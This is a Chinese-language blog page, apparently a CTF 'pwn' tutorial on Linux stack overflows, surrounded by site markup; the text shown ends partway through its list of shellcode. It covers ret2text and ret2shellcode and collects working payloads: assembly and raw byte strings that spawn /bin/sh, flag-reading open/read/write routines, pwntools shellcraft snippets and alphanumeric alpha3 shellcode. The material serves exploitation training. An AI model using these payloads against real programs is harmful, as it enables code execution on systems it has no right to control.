<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2024/11/08/linux-stack-overflow/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="逻辑漏洞 栈溢出往往可以覆盖栈上的其他局部变量造成逻辑漏洞。 ret2text 栈溢出覆盖返回地址为后门函数从而获取shell。 ret2shellcode 将shellcode写入可执行的内存地址处，然后栈溢出覆盖返回地址到shellcode从而执行shellcode获取shell。 测试 shellcode 例题：  32位例题：wdb_2018_3rd_soEasy 64位">
<meta property="og:type" content="article">
<meta property="og:title" content="linux 栈溢出">
<meta property="og:url" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/index.html">
<meta property="og:site_name" content="sky123">
<meta property="og:description" content="逻辑漏洞 栈溢出往往可以覆盖栈上的其他局部变量造成逻辑漏洞。 ret2text 栈溢出覆盖返回地址为后门函数从而获取shell。 ret2shellcode 将shellcode写入可执行的内存地址处，然后栈溢出覆盖返回地址到shellcode从而执行shellcode获取shell。 测试 shellcode 例题：  32位例题：wdb_2018_3rd_soEasy 64位">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/0386c58178b9c5d125f63daaba1d0ab2.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/513d283d1e58ea87558b0a1c7be5f06a.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/71e04df6969db4f75dcf43f09246a92b.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/5dfa1cfa3febe69de060b44636b1d515.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/c1fdf7342f4974e396840a515fd5cafe.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/467d83f627ee475bff7982574983ebbb.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/d0960c383618941fa65bf62b257c8f79.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/41c4d94f80c46b5ce1ddd2376a57f3d1.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/db12ad52b7a1912665ab0bc5ed002e66.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/d05fcb3f3322bf190a51a7088d9b1ad1.png">
<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/52d2f9340bd5f998d2887f40be788f3e.png%20=70%x">
<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/d9b4d1426691a6b5f2d36eab1f459760.png%20=60%x">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/e67b342e7833f0cba6904e7f65910901.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/6dafe13803caaf398e55613189c6bda3.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/9d2f83c616a5538a3a4ea6975318bc19.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/036ee63b7bb54a4fe5d98c064c787fec.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/e3e1b6a53bd2c560f2b08fc27d87d60d.png">
<meta property="og:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/d69ea986473e28e4a4ac62a88a12edec.png">
<meta property="article:published_time" content="2024-11-07T19:10:56.005Z">
<meta property="article:modified_time" content="2024-11-19T19:33:31.701Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="linux user pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://skyi23.github.io/2024/11/08/linux-stack-overflow/images/0386c58178b9c5d125f63daaba1d0ab2.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            linux 栈溢出 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/build/css/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"9.3.0"}},"version":"2.8.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">25</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">linux 栈溢出</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-11-08 03:10:56</span>
        <span class="mobile">2024-11-08 03:10:56</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-11-20 03:33:31</span>
            <span class="mobile">2024-11-20 03:33:31</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/pwn/">pwn</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/pwn/linux-user-pwn/">linux user pwn</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/linux-user-pwn/">linux user pwn</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>9.5k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>44 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="逻辑漏洞">逻辑漏洞</h1>
<p>栈溢出往往可以覆盖栈上的其他局部变量造成逻辑漏洞。</p>
<h1 id="ret2text">ret2text</h1>
<p>栈溢出覆盖返回地址为后门函数从而获取shell。</p>
<h1 id="ret2shellcode">ret2shellcode</h1>
<p>将shellcode写入可执行的内存地址处，然后栈溢出覆盖返回地址到shellcode从而执行shellcode获取shell。
测试 shellcode 例题：</p>
<ul>
<li><p>32位例题：wdb_2018_3rd_soEasy</p></li>
<li><p>64位例题：ciscn_2019_n_5</p></li>
</ul>
<h2 id="手写">手写</h2>
<ul>
<li><p>32位</p>
<ul>
<li><p>shell（21字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x68732f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 11</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div></li>
<li><p>orw（56字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /*open(./flag)*/</span></span><br><span class="line"><span class="string">    push 0x1010101</span></span><br><span class="line"><span class="string">    xor dword ptr [esp], 0x1016660</span></span><br><span class="line"><span class="string">    push 0x6c662f2e</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*read(fd,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov ecx,esp</span></span><br><span class="line"><span class="string">    mov edx,0x30</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*write(1,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,0x1</span></span><br><span class="line"><span class="string">    mov eax,0x4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>无 <code>\x00</code> 截断版（21字节）</p></li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br></pre></td></tr></table></figure></div>
<p>scanf 可读取版（41字节）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br></pre></td></tr></table></figure></div></li>
<li><p>64位</p>
<ul>
<li><p>shell（22字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>无 <code>\x00</code> 截断且 scanf 可读版（22字节）</p></li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p>orw（43字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>某些题目还会禁用 SYS_open ，需要用 SYS_openat 代替。</p></li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e ;// ./flag</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, -100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 257 ;// SYS_openat</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">    mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">    mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">    mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">    mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">    mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">    mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">    mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 123 ;// error_code</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="pwntools-生成">pwntools 生成</h2>
<ul>
<li><p>shell（32位44字节，64位48字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.arch = elf.arch</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure></div></li>
<li><p>orw</p>
<ul>
<li><p>32位（55字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure></div></li>
<li><p>64位（66字节）</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure></div></li>
</ul></li>
</ul>
<h2 id="纯-ascii-码-shellcode">纯 ascii 码 shellcode</h2>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/TaQini/alpha3" >alpha3<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>
项目可以实现可见 shellcode 。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;shellcode&quot;</span>, <span class="string">&quot;wb+&quot;</span>)</span><br><span class="line">fp.write(asm(shellcraft.sh()))</span><br><span class="line">fp.close()</span><br><span class="line"></span><br><span class="line">shellcode = os.popen(<span class="string">&quot;python ./alpha3/ALPHA3.py x64 ascii mixedcase rax --input=shellcode&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> shellcode</span><br></pre></td></tr></table></figure></div>
<p><strong>注意：alpha3 生成 shellcode 时如果设置 rax 那么跳转至
shellcode 时 rax 必须为 shellcode
的地址。设置为其他寄存器同理。</strong></p>
<ul>
<li><p>32 位（70字节，eax）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hffffk4diFkTpj02Tpk0T0AuEE2O092w390k0Z0X7L0J0X137O080Y065N4o114C3m3H01</span><br></pre></td></tr></table></figure></div></li>
<li><p>64 位（105字节，rax）</p>
